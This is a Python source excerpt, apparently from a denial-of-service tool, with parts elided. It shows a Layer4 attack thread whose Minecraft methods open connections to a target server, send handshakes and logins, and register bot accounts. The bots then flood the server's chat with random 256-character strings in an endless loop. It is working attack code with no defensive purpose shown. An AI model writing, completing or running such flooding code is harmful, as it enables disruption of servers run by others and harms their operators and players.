...
from socket import AF_INET, IPPROTO_ICMP, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, IP_HDRINCL, SOCK_DGRAM, SOCK_RAW, SOCK_STREAM, TCP_NODELAY, socket
...
class Layer4(Thread):
    ...
    def MC(self) -> None:
        handshake = Server.handshake(self._target, self.protocolid, 1)
        ping = Server.data(b'\x00')
    ...
    def MCBOT(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(s, Server.handshake_forwarded(self._target,
                                                        self.protocolid,
                                                        2,
            ...
            Tools.send(s, Server.login(self.protocolid, username))
            
            sleep(1.5)

            Tools.send(s, Server.chat(self.protocolid, "/register %s %s" % (password, password)))
            Tools.send(s, Server.chat(self.protocolid, "/login %s" % password))

            while Tools.send(s, Server.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                sleep(1.1)
